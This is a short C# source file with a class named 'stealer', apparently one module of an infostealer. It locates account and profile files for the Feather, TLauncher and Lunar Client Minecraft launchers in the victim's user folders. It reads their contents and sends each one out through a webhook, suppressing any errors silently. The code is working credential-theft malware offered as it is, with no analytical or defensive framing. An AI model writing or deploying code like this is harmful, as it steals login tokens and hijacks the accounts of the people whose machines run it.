using System;
using System.Collections.Generic;
using System.Data.Common;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection.Emit;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using xyz.config;
using static System.Net.Mime.MediaTypeNames;

namespace xyz.functions
{
    class stealer
    {
        static string roamingPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming";

        static Dictionary<string, string> Paths = new Dictionary<string, string>
        {
            {"feather", Path.Combine(roamingPath, ".feather", "accounts.json")},
            {"tlauncher", Path.Combine(roamingPath, ".tlauncher", "TlauncherProfiles.json")},
            { "Lunar" , Path.Combine(Environment.GetEnvironmentVariable("userprofile"), ".lunarclient", "settings", "game", "accounts.json") },

        };

        static public async Task Invoke()
        {
            foreach (var item in Paths)
            {
                try
                {
                    if (File.Exists(item.Value))
                    {
                        string text = File.ReadAllText(item.Value);
                        await Task.Delay(600);

                        await Manager.SendWebhook(text);
                    }
                }
                catch
                {}
            }
        }
    }
}
